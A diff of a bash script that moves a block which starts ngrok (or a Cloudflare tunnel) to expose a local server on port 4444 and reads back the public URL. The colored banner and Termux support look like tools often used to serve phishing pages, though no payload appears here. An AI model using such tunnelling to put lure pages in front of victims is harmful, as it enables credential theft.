@@ -58,25 +58,7 @@ echo ""
                            sleep 3
 			   echo ""
 			   
-			   
-			   
-			   echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://127.0.0.1:4444 ${GREEN})"
-	{ sleep 1; }
-	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
-
-    if [[ `command -v termux-chroot` ]]; then
-        sleep 2 && termux-chroot ./ngrok http 127.0.0.1:4444 > /dev/null 2>&1 & 
-    else
-        sleep 2 && ./ngrok http 127.0.0.1:4444 > /dev/null 2>&1 &
-    fi
-
-	{ sleep 8; clear; banner_small; }
-	nlink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
-			   
-			   
-			   
-}			   
-			   
+	
 		
 			   
                            echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://127.0.0.1:4444 ${GREEN})"
@@ -92,6 +74,25 @@ echo ""
 				{ sleep 8; clear; }
 	
 				clink=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cld.log")
+			   
+			   
+			   
+			    
+			   
+			   echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://127.0.0.1:4444 ${GREEN})"
+	{ sleep 1; }
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
+
+    if [[ `command -v termux-chroot` ]]; then
+        sleep 2 && termux-chroot ./ngrok http 127.0.0.1:4444 > /dev/null 2>&1 & 
+    else
+        sleep 2 && ./ngrok http 127.0.0.1:4444 > /dev/null 2>&1 &
+    fi
+
+	{ sleep 8; clear; banner_small; }
+	nlink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
+			   
+			   
 			   
 			   
 			   echo ""
